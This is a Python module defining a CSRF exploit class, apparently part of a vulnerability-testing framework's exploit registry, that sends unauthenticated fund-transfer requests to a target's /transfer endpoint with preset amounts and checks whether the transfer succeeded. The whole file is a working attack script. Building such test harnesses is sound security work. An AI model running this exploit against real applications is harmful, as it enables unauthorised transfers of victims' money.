import requests
from .registry import Exploit, ExploitResult


class CSRFTransfer(Exploit):
    id = "csrf_transfer"
    name = "CSRF - Unauthorized Transfer"
    category = "csrf"
    description = "Performs unauthorized fund transfer without CSRF token"
    payloads = [
        "100",
        "500",
        "9999",
    ]
    
    def execute(self, target_url: str, payload_index: int = 0) -> ExploitResult:
        amount = int(self.get_payload(payload_index))
        try:
            resp = requests.post(
                f"{target_url}/transfer",
                json={"amount": amount},
            )
            data = resp.json()
            return ExploitResult(
                success=self.check_success(data),
                response=data,
                payload_used=str(amount),
            )
        except requests.RequestException as e:
            return ExploitResult(
                success=False,
                response={},
                payload_used=str(amount),
                error=str(e),
            )
    
    def check_success(self, response: dict) -> bool:
        return response.get("status") == "Transfer successful"
